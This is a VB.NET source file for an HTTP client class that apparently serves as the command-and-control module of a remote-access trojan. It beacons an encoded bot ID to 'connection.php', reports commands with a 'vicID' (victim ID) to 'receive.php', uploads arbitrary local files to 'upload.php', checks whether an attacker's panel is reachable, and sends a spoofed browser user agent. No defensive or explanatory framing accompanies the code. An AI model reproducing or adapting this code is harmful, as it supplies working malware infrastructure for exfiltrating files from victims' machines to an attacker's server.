Imports System.Net
Imports System.Text
Imports System.IO

Namespace HTTPSocket
    Public Class HTTP
        Public Host As String
        Public Data As String
        Public Y As String = "|BN|"
        Public ID As String
        Dim logincookie As CookieContainer


        Public Function Connect()
            Try
                _POST("connection.php", "data=" & ENB(ID & Y & Data))
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function

        Public Function ENB(ByRef s As String) As String
            Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
            Dim output = Convert.ToBase64String(byt)
            output = output.Split("=")(0)
            output = output.Replace("+", "-")
            output = output.Replace("/", "_")
            ENB = output
        End Function

        Public Function DEB(ByRef s As String) As String
            Dim output = s
            output = output.Replace("-", "+")
            output = output.Replace("_", "/")

            Select Case output.Length Mod 4
                Case 0
                Case 2
                    output += "=="
                Case 3
                    output += "="
            End Select
            Dim converted = Convert.FromBase64String(output)
            DEB = System.Text.Encoding.UTF8.GetString(converted)
        End Function

        Public Function _GET(ByVal request As String)
            Try
                Dim Socket As New WebClient
                Return Socket.DownloadString(Host & "/" & request)
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function

        Public Function _POST(ByVal filename As String, ByVal requstData As String)
            Dim postData As String = requstData
            Dim tempCookies As New CookieContainer
            Dim encoding As New UTF8Encoding
            Dim byteData As Byte() = encoding.GetBytes(postData)

            Dim postReq As HttpWebRequest = DirectCast(WebRequest.Create(Host & "/" & filename), HttpWebRequest)
            postReq.Method = "POST"
            postReq.KeepAlive = True
            postReq.CookieContainer = tempCookies
            postReq.ContentType = "application/x-www-form-urlencoded"
            postReq.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
            postReq.ContentLength = byteData.Length

            Dim postreqstream As Stream = postReq.GetRequestStream()
            postreqstream.Write(byteData, 0, byteData.Length)
            postreqstream.Close()
            Dim postresponse As HttpWebResponse

            postresponse = DirectCast(postReq.GetResponse(), HttpWebResponse)
            tempCookies.Add(postresponse.Cookies)
            logincookie = tempCookies
            Dim postreqreader As New StreamReader(postresponse.GetResponseStream())

            Dim thepage As String = postreqreader.ReadToEnd
            Return thepage
        End Function

        Public Function Send(ByVal Command As String)
            Try
                Dim Socket As New WebClient

                Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))

                Return True
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function

        Public Function Upload(ByVal Filepath As String)
            Try
                Dim Socket As New WebClient
                Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
                Return True
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function

        Public Function Log(ByVal Type As String, ByVal Message As String)
            Send("NewLog" & Y & Type & Y & Message)
            Return True
        End Function

        Public Function IsPanel(ByVal PanelURL As String)
            Dim url As New System.Uri(PanelURL)
            Dim req As System.Net.WebRequest
            req = System.Net.WebRequest.Create(url)
            Dim resp As System.Net.WebResponse
            Try
                resp = req.GetResponse()
                resp.Close()
                req = Nothing
                Return True
            Catch ex As WebException
                req = Nothing
                Return False
            End Try
            Return ""
        End Function
    End Class
End Namespace
